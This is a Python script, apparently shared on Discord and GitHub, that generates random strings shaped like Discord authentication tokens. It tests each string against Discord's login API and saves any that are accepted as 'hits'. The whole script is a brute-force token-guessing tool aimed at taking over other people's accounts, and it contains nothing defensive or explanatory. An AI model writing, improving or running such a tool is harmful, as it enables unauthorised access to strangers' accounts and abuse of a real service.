import random
import time
import requests
import os
import ctypes
from tkinter import filedialog
from os import path
from pathlib import Path
import pathlib

try:

    os.system("title [PROXYLESS] Token Generator and Checker - .gg/katexod")
    print("github.com/KatExoD")
    print("   ")
    print("   ")
    print("   ")
    x = input("Where to save hits to? \n")

    xx = open(x, "w+")
    v = 0
    b = 0
    ttal = 0

    token = ""

    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789_"

    f = open("temptokens.txt", "w+")
    f1 = open(x, "w")

    number_of_tokens = input("Number of Tokens? \n")

    for c in range(int(number_of_tokens)):
        part1 = ""
        part2 = ""
        part3 = ""
        for x in range(23):
            part1 += random.choice(chars)
        for x in range(6):
            part2 += random.choice(chars)
        for x in range(27):
            part3 += random.choice(chars)
        part1 = str(part1)
        part2 = str(part2)
        part3 = str(part3)
        part1 = part1 + "."
        part2 = part2 + "."
        i = random.choice("O")
        token = i + part1 + part2 + part3
        text2save = str(token + "\n") # starts from `1.0`, not `0.0`
        f.writelines(text2save)
    f.close()
    f2 = open("temptokens.txt", "r")
    yyy = f2.readlines()
    yyyy = len(yyy)

    print("Btw, this is a proxyless checker!")

    for tt in yyy:
        t = tt.rstrip()
        headers={
                    'Authorization': t
                }
        check = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
        try:
            if check.status_code == 200:
                print("\033[1;32;40m[VALID] " + t)
                f1.writelines(t + '\n')
                v += 1
            else:
                print("\033[1;31;40m[INVALID] " + t)
                b += 1
        except Exception:
            print("\033[1;31;40mYeah we can't contact discordapp.com")
        ttal += 1
        varfort = "Checked: " + str(ttal) + "/" + str(yyyy) + " | Valid: " + str(v) + " | Invalid: " + str(b) + " |"
        ctypes.windll.kernel32.SetConsoleTitleW(f"[PROXYLESS] Token Generator and Checker - .gg/katexod | {varfort}")
except:
    print("ay bro u got an error")
print("\033[1;37;40m---------------------------")
print("\033[1;32;40mValid Tokens: " + str(v))
print("\033[1;31;40mInvalid Tokens: " + str(b))
print("\033[1;37;40m---------------------------")

f1.close()

f2.close()